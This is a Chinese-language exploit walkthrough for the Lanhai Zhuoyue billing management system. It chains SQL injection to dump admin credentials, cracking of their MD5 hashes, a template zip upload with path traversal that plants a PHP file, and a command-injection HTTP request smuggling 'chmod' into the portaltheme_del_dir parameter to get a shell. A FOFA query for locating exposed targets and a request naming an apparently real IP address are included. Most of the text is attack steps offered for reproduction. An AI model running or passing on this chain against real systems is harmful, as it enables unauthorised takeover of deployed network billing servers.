# 蓝海卓越计费管理系统多漏洞导致getshell

# 一、漏洞简介
 蓝海卓越认证计费管理系统是一套以实现网络运营为基础，增强全局安全为中心，提高管理效率为目的的网络安全运营管理系统，提供“高安全、可运营、易管理”的运营管理体验，基于标准的RADIUS协议开发，它不仅支持PPPOE和WEB认证计费，还支持802.1X接入控制技术，与其他厂商支持相应标准的产品兼容，结合蓝海卓越的PPPOE服务器网关，可提供更加丰富的功能。，另外，友好的Web访问管理的方式，为用户提供更好用、易用的方式，更贴心的使用形式。蓝海卓越计费管理系统多漏洞导致getshell

# 二、影响版本
+ 蓝海卓越 计费管理系统

# 三、资产测绘
+ fofa`title=="蓝海卓越计费管理系统"`
+ 特征

![1716136162798-aa34ed6f-ea20-43f2-99a7-dba6a1e626c9.png](./img/qe1tkFLp9GezjB1g/1716136162798-aa34ed6f-ea20-43f2-99a7-dba6a1e626c9-253370.png)

# 四、漏洞复现
```plain
/ajax/loaduser.php?UserName=1
```

通过注入跑出账号密码

![1716389345421-9e38d8dd-0c85-4c42-ac5d-d9fb1116d3a3.png](./img/qe1tkFLp9GezjB1g/1716389345421-9e38d8dd-0c85-4c42-ac5d-d9fb1116d3a3-823276.png)

使用MD5解密出密码后登录系统

![1716389833186-8bbff4b6-dff5-46f8-855d-a6a901787035.png](./img/qe1tkFLp9GezjB1g/1716389833186-8bbff4b6-dff5-46f8-855d-a6a901787035-819521.png)

![1716389848399-cb2cc634-200c-4818-be59-4381433c5a6b.png](./img/qe1tkFLp9GezjB1g/1716389848399-cb2cc634-200c-4818-be59-4381433c5a6b-844579.png)

点击PORTAL模板下面的PORTAL模板管理，选择上传模板

![1716390460832-fd0d98ce-26e8-41ea-973e-95e1b6ae9522.png](./img/qe1tkFLp9GezjB1g/1716390460832-fd0d98ce-26e8-41ea-973e-95e1b6ae9522-847896.png)

[root.zip](https://www.yuque.com/attachments/yuque/0/2024/zip/29512878/1716438804359-a43f8695-df0c-4b28-83bc-e23064072257.zip)

由于新版本系统的模板位置不在web路径下，所以需要穿越模板路径

Web绝对路径：

```plain
/usr/local/usr-gui/
```

模板路径：

```plain
/mnt/mysql/usr/local/portal/themes/20240519093115_xxx/
```

制作一个如下的压缩包：

![1716389926031-814570a6-da10-4a06-ab0b-d76d6c891411.png](./img/qe1tkFLp9GezjB1g/1716389926031-814570a6-da10-4a06-ab0b-d76d6c891411-903276.png)

test.php内容为：字符编码必须为Unix(LF)

```plain
#!/bin/php
<?php
phpinfo();
?>
```

![1716390048945-ca864ffe-6e01-4bb6-8592-e78b6a92518e.png](./img/qe1tkFLp9GezjB1g/1716390048945-ca864ffe-6e01-4bb6-8592-e78b6a92518e-619177.png)



上传zip压缩包

![1716390233650-ab77d4c6-3b4f-47a0-a7ae-3118efd6819f.png](./img/qe1tkFLp9GezjB1g/1716390233650-ab77d4c6-3b4f-47a0-a7ae-3118efd6819f-134490.png)

Shell位置为：

```plain
/test.php
```

但是访问时会提示：

![1716390275360-c5689377-8edc-4977-a8dd-7f3449abc878.png](./img/qe1tkFLp9GezjB1g/1716390275360-c5689377-8edc-4977-a8dd-7f3449abc878-072747.png)

接下来就需要使用后台命令执行漏洞进行权限赋予：

```plain
GET /ajax_check.php?portaltheme_del_id=4&portaltheme_del_dir=%2Fmnt%2Fmysql%2Fusr%2Flocal%2Fportal%2Fthemes%2F20210519093903_738%2F|chmod+755+/usr/local/usr-gui/test.php HTTP/1.1
Host: 
Accept: */*
DNT: 1
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 SE 2.X MetaSr 1.0
Referer: http://124.114.151.106:8880/portaltheme_list.php
Accept-Language: zh-CN,zh;q=0.9
Cookie: mylang=zh_s; PHPSESSID=lp91fvnja6f987dj7jmkjh5601
Connection: close

```

![1716390344536-d72391d6-2178-4dfa-ac0e-72962047e530.png](./img/qe1tkFLp9GezjB1g/1716390344536-d72391d6-2178-4dfa-ac0e-72962047e530-418615.png)

之后再次访问

```plain
/test.php
```

![1716390374521-ebe7f986-e300-4ac6-8b2a-d9e26cf8f674.png](./img/qe1tkFLp9GezjB1g/1716390374521-ebe7f986-e300-4ac6-8b2a-d9e26cf8f674-878726.png)



> 更新: 2024-05-23 12:33:24  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/dbwc8rx9kq4t14eb>